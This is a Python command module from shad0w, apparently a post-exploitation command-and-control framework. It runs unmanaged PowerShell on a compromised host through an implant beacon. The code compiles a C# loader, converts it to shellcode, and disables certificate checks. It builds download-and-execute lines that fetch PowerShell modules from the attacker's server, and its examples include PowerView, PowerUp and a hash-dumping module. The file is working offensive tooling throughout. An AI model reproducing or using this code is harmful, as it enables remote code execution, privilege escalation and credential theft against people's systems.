#
# Run unmanaged powershell on a session
#

import os
import sys
import string
import random
import base64
import argparse

from lib import shellcode

__description__ = "Run unmanaged powershell on a session"
__author__ = "@_batsec_"

# identify the task as shellcode execute
from lib.basecommand import BaseCommand

USERCD_EXEC_ID = 0x3000

# location of psh binary
PSH_BIN = "/root/shad0w/modules/windows/psh/build/psh.exe"

# did the command error
ERROR = False
error_list = ""

# make the command output a bit cleaner
FIRST_OUTPUT = True

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def psh_callback(shad0w, data):
    global FIRST_OUTPUT

    if FIRST_OUTPUT:
        print("")
        FIRST_OUTPUT = False

    data = data.replace("[+]", "\033[1;32m[+]\033[0m")
    data = data.replace("[!]", "\033[1;31m[!]\033[0m")
    data = data.replace("[i]", "\033[1;34m[i]\033[0m")
    data = data.replace("[*]", "\033[1;34m[*]\033[0m")

    sys.stdout.write(data)

    return ""

def encode_string(data):
    return base64.b64encode(data.encode())

def random_string():
    rstring = ""
    alphabet = string.ascii_lowercase + string.ascii_uppercase

    for _ in range(0, 10):
        rstring += random.choice(alphabet)

    return rstring

def do_copy():
    os.system("cp /root/shad0w/modules/windows/psh/*.cs /root/shad0w/modules/windows/psh/build")
    os.system("cp /root/shad0w/modules/windows/psh/*.dll /root/shad0w/modules/windows/psh/build")

def write_args(pwsh):
    do_copy()

    new_file = ""
    with open("/root/shad0w/modules/windows/psh/build/main.cs", "r") as file:
        data = file.read()

    for line in data.splitlines():
        if "Super 1337 Powershell" in line:
            line = f"            string b64_cmd = \"{pwsh}\";"
        new_file += line + '\n'

    with open("/root/shad0w/modules/windows/psh/build/main.cs", "w") as file:
        file.write(new_file)

def compile_binary():
    cwd = os.getcwd()

    os.chdir("/root/shad0w/modules/windows/psh/build/")
    os.system("mcs /reference:System.Management.Automation.dll -out:psh.exe main.cs")
    os.chdir(cwd)


class PshCommand(BaseCommand):
    def __init__(self, args):
        BaseCommand.__init__(self, "psh", args)

    def parse_parameters(self):
        # set the possible arguments
        self.parser.add_argument("-c", "--command", nargs="+", required=False, help="Powershell command to execute")
        self.parser.add_argument("-m", "--module", required=False, help="Powershell modules to load")
        self.parser.add_argument("-l", "--list", required=False, action='store_true', help="List all the available modules")
        self.parser.add_argument("-i", "--info", required=False, help="Get infomation on a module")

    def get_usage(self):
        return """

Examples:

psh Get-Process
psh -c Get-Process
psh -m PowerView -c Get-NetUser
psh -m GetHash,PowerUp -c Invoke-AllChecks; Invoke-GetHash
psh --list
psh --info GetHash
"""

    def run(self, shad0w):
        # kinda a hack to make sure we intergrate nice with the shellcode generator
        donut_args = DummyClass()

        psh_args = ""

        if self.args.info:
            basedir = "/root/shad0w/scripts/"
            self.args.info = self.args.info + ".ps1"
            if self.args.info not in os.listdir(basedir):
                shad0w.debug.error(f"No module with name '{self.args.info}'")
                return
            os.system(f"less {basedir + self.args.info}")
            return

        if self.args.list:
            modules = os.listdir("/root/shad0w/scripts")
            shad0w.debug.log(f"{len(modules)} available modules\n", log=True)
            for module in modules:
                print("-\t", module.replace(".ps1", ""))
            return

        if self.args.module:

            modules = self.args.module.split(',')

            psh_args += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; "

            for module in modules:
                module_path = f"/root/shad0w/scripts/{module}.ps1"

                with open(module_path, "r") as file:
                    mod_data = file.read()

                serve_path = "/" + random_string()
                shad0w.debug.log(f"Hosting module '{module}' ({len(mod_data)} bytes) => {serve_path}", log=True)
                shad0w.beacons[shad0w.current_beacon]["serve"][serve_path] = mod_data

                iex = f"IEX(New-Object System.Net.WebClient).DownloadString(\"https://{shad0w.endpoint}{serve_path}\"); "

                psh_args += iex

        if self.args.command:
            cmd = ' '.join(self.raw_args[self.raw_args.index("-c") + 1:])
            psh_args += cmd

        donut_args.param = False
        donut_args.cls = False
        donut_args.method = False
        donut_args.runtime = False
        donut_args.appdomain = False

        psh_args = encode_string(psh_args).decode()

        write_args(psh_args)
        compile_binary()

        b64_comp_data = shellcode.generate(PSH_BIN, donut_args, None)

        shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
        shad0w.beacons[shad0w.current_beacon]["callback"] = psh_callback
        pass


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    if shad0w.endpoint is None:
        print(f"\033[1;33mMirror mode: Parameter -e (endpoint) not set. Powershell modules will not work.\033[0m")

    cmd = PshCommand(args)
    if cmd.parse():
        cmd.run(shad0w)
